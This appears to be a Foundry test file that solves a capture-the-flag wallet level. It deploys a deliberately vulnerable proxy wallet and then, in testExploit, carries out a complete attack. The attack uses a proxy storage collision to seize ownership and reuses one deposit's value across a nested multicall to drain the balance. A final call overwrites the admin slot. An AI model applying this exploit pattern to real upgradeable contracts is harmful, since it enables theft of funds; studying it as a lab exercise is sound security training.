// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/24_PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleProxy proxy;
    PuzzleWallet wallet;

    address owner = address(0x999);
    address hacker = address(0x1337);

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(hacker, 1 ether);

        vm.startPrank(owner);

        PuzzleWallet implementation = new PuzzleWallet();

        bytes memory initData = abi.encodeWithSelector(
            PuzzleWallet.init.selector,
            type(uint256).max
        );

        proxy = new PuzzleProxy(owner, address(implementation), initData);

        wallet = PuzzleWallet(address(proxy));

        wallet.addToWhitelist(owner);
        wallet.deposit{value: 0.001 ether}();

        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(hacker);
        proxy.proposeNewAdmin(hacker);
        wallet.addToWhitelist(hacker);
        bytes memory depositData = abi.encodeWithSelector(
            wallet.deposit.selector
        );
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = depositData;
        bytes memory nestedMulticallData = abi.encodeWithSelector(
            wallet.multicall.selector,
            innerData
        );
        bytes[] memory finalData = new bytes[](2);
        finalData[0] = depositData;
        finalData[1] = nestedMulticallData;
        wallet.multicall{value: 0.001 ether}(finalData);
        wallet.execute(hacker, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(hacker)));
        vm.stopPrank();

        assertEq(proxy.admin(), hacker);
    }
}
